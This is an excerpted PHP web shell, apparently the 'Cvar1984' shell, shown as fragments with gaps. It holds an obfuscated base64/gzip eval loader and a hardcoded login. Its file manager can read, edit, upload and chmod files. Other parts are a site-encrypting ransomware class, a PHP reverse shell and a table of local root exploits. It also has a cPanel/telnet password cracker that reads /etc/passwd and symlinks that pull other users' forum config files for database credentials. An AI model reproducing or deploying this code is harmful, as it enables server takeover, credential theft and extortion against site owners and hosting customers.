...
eval(
    gzuncompress(
        base64_decode(
            "eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx"
        )
    )
);
function Zip($source, $destination)
...
if ($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
    if ($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
        print '<script>document.cookie="user=' .
            $_POST["usrname"] .
...
" .
    $ox .
    " </font> <font color=\"#666\" >|</font>
" .
    php_uname() .
    "<br>
 Your IP : <font color=red>" .
    $your_ip .
    "</font>
<font color=\"#666\" >|</font>
 Server IP : <font color=red>" .
    $srvr_ip .
    "</font>
 <font color=\"#666\" > | </font>
...
</font><a style='color:red; text-decoration:none;' target=_blank href=?phpinfo>" .
    phpversion() .
    "</a>
...
<li>[<a href=\"?terjemah\">Byksw Translate</a>]</li>
...
function drivesx()
{
    foreach (range('A', 'Z') as $drive) {
        if (is_dir($drive . ':\\')) {
            echo "<a> [<a style='color:aqua; text-decoration:none;' href='?path=" .
                $drive .
                ":\\'> " .
                $drive .
                " </a>] </a>";
...
function rename_ui()
{
	...
	<form method='GET'><input type=hidden name='old_name' size='40' value=" .
        $rf_path .
        ">New Name : <input name='new_name' size='40' value=" .
        basename($rf_path) .
        ">
...
function terjemah()
{
	...
	<center>
	<form method="post">
	<textarea style="width: 670px; height: 243px;" name="text"></textarea><br />
	<input type="submit" name="submit" value="terjemah" />
	</form>
	<textarea style="width: 670px; height: 243px;" readonly>';
    if ($_POST["submit"] == "terjemah") {
        $text = $_POST["text"];
        $output = str_replace("e", "w", $text);
        $output2 = str_replace("o", "w", $output);
        $output3 = str_replace("a", "w", $output2);
        $output4 = str_replace("u", "w", $output3);
        $output5 = str_replace("i", "y", $output4);
        // huruf gede
        $output6 = str_replace("E", "W", $output5);
        $output7 = str_replace("O", "W", $output6);
        $output8 = str_replace("A", "W", $output7);
        $output9 = str_replace("U", "W", $output8);
        $output10 = str_replace("I", "Y", $output9);
        echo $output10;
    }
...
<div class='result'>";
    ...
    class deRanSomeware
    {
        ...
        public function shcdirs($dir, $method, $key)
        {
            ...
            foreach (scandir($dir) as $d) {
                if ($d != '.' && $d != '..') {
                    ...
                    if (!is_dir($locate)) {
                        if (
                            deRanSomeware::kecuali($locate, "ini.php") &&
                            deRanSomeware::kecuali($locate, ".png") &&
                            deRanSomeware::kecuali($locate, ".htaccess") &&
                            deRanSomeware::kecuali($locate, "ini.php") &&
                            deRanSomeware::kecuali($locate, "index.php") &&
                            deRanSomeware::kecuali($locate, ".htabak")
                        ) {
                            switch ($method) {
                                case '1':
        ...
        public function shcEnCry($key, $locate)
        {
            ...
            if (file_put_contents($locate, $encrypted)) {
                echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' .
                    $locate .
                    '</font> <br>';
            } else {
                echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> ' .
                    $locate .
                    ' <br>';
            }
        }
        public function shcDeCry($key, $locate)
        {
            ...
            if (file_put_contents($locate, $decrypted)) {
                echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">' .
                    $locate .
                    '</font> <br>';
            } else {
                echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">' .
                    $locate .
                    '</font> <br>';
            }
        }
    ...
    if ($_POST['submit']) {
        switch ($_POST['method']) {
            case '1':
                deRanSomeware::shcdirs(
                    deRanSomeware::locate(),
                    "1",
                    $_POST['key']
                );
                break;
...
<table class=table>
    ...
    foreach ($dirs as $dir) {
        echo "<tr><td><a href='{$self}?path={$dir}'>" .
            basename($dir) .
            "</a></td>
<td>" .
            filesize_x($dir) .
            "</td>
<td><a href='{$self}?path={$path}&amp;perm={$dir}'>" .
            file_perm($dir) .
            "</a></td>
...
| <a href='{$self}?zip={$dir}'> Download </a></td></tr>";
    ...
    foreach ($fils as $fil) {
        echo "<tr><td><a href='{$self}?path={$path}&amp;read={$fil}'>" .
            basename($fil) .
            "</a></td>
              <td>" .
            filesize_x($fil) .
            "</td>
              <td><a href='{$self}?path={$path}&amp;perm={$fil}'>" .
            file_perm($fil) .
            "</a></td>
...
function edit_file()
{
	...
	<font color=red>View File</font> : <font color=yellow><a style='text-decoration:none; color:yellow;' href='?read=" .
        $_GET['edit'] .
        "'>" .
        basename($_GET['edit']) .
        "</a><br /><br /><hr><br></font>
<form method='POST'><input type='hidden' name='e_file' value=" .
        $_GET['edit'] .
        ">
          <center><textarea spellcheck='false' class='textarea_edit' name='e_content_n' cols='80' rows='25'>" .
        $o_content .
        "</textarea></center>
		  <hr>
...
<font color=#999><a style='text-decoration:none; color:yellow;' href='?path={$path}&amp;edit=" .
        $_GET['read'] .
        "'>" .
        basename($_GET['read']) .
        "</a></font><br><br><hr><pre><code>" .
        $rr_content .
        "</code></pre>
<br><br><hr><br><br></div>";
}
...
{
    echo "<div id=result><center><h2>Copy File</h2><hr /><br /><br /><table class=table><form method='GET'><tr><td style='text-align:center;'>Copy : <input size=40 name='c_file' value=" .
        $_GET['copy'] .
        " > To : <input size=40
name='c_target' value=" .
        $_GET['path'] .
...
function copy_file_bg()
{
    ...
    if (function_exists(copy)) {
        if (
            copy($_GET['c_file'], $_GET['c_target'] . $sep . $_GET['cn_name'])
        ) {
            alert("Succeded");
        } else {
            alert("Access Denied");
...
function ch_perm_ui()
{
    ...
    <input type='hidden' name='path' value=" .
        getcwd() .
        " ><input name='p_filex' type=hidden
value={$p_file} >New Permission : <input name='new_perm' isze='40'
value=0" .
        substr(sprintf('%o', fileperms($p_file)), -3) .
...
color=yellow><h2>root@Cvar1984:~#</h2></center><hr><pre>" .
            $res .
            "</font></pre></div>";
    }
    return $res;
...
function upload_file()
{
    ...
    if (
        move_uploaded_file(
            $_FILES['upload_f']['tmp_name'],
            $_FILES['upload_f']['name']
        )
    ) {
...
function reverse_conn_bg()
{
    ...
    if ($option == "PHP Reverse Shell") {
        ...
        printit(
            "<font color=yellow>Successfully opened reverse shell to $ip:$port </font>"
        );
        while (1) {
            if (feof($sock)) {
...
<pre>";
    ...
    class jalanin
    {
        ...
        public function cek($patch)
        {
            ...
            if ($match[0]) {
                echo "<font color='yellow'>[EXECUTION FILE] " .
                    $patch .
                    "</font><br><hr>";
            } elseif (exif_read_data($patch)) {
                echo "<font color='red'>[LOGGER DETECTED] " .
                    $patch .
                    "</font><br><hr>";
            } else {
                echo "<font color='lime'>[FILE SAFE] " .
                    $patch .
                    "</font><br><hr>";
            }
        }
...
function r00t_exploit()
{
    ...
    $r00t_db = [
        ...
        '2.4.20' =>
            'mremap_pte, w00t,brk,ave,uselib24,loginx,ptrace-kmod,ptrace,kmod',
...
?>";
	...
	<hr><textarea spellcheck='false' class=textarea_edit cols='80' rows='25'>" .
        htmlspecialchars($res_t) .
        "</textarea></center></div>";
}
...
class=textarea_edit name=username rows=25 cols=35 class=box><?php if (
    $os != "win"
) {
    if (@file('/etc/passwd')) {
...
value="O" class=but></td>
		...
		<?php } else {if (empty($_POST['username']) || empty($_POST['password'])) {
            ...
            if (
                $_POST['cracktype'] == "cpanel" ||
                $_POST['cracktype'] == "telnet"
            ) {
                if ($cracktype == "telnet") {
                    $cpanel_port = "23";
                } else {
...
href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=" .
        php_uname(s) .
        "'>" .
        php_uname(s) .
        "</td></tr>
...
Setting : <font color=7171C6><pre>" .
            cmd('net
accounts') .
            "</pre></td></tr>
               <tr><td style='text-align:left'>User Accounts :
<font color=7171C6><pre>" .
            cmd('net
user') .
            "</pre></td></tr>
               ";
...
{
    symlink(
        '/home/' . $usernamexx . '/public_html/vb/includes/config.php',
        'Cvar1984/' .
            $domainxx .
            '
=>vBulletin1.txt'
    ...
    symlink(
        '/home/' . $usernamexx . '/public_html/includes/config.php',
        'Cvar1984/' .
            $domainxx .
            '
=>vBulletin2.txt'
    ...
    symlink(
        '/home/' . $usernamexx . '/public_html/forum/includes/config.php',
        'Cvar1984/' .
            $domainxx .
            '
=>vBulletin3.txt'
    ...
    symlink(
        '/home/' . $usernamexx . '/public_html/cc/includes/config.php',
        'Cvar1984/' .
            $domainxx .
            '
=>vBulletin4.txt'
    ...
    symlink(
        '/home/' . $usernamexx . '/public_html/inc/config.php',
        'Cvar1984/' .
            $domainxx .
            '
=>mybb.txt'
    ...
    symlink(
        '/home/' . $usernamexx . '/public_html/config.php',
        'Cvar1984/' .
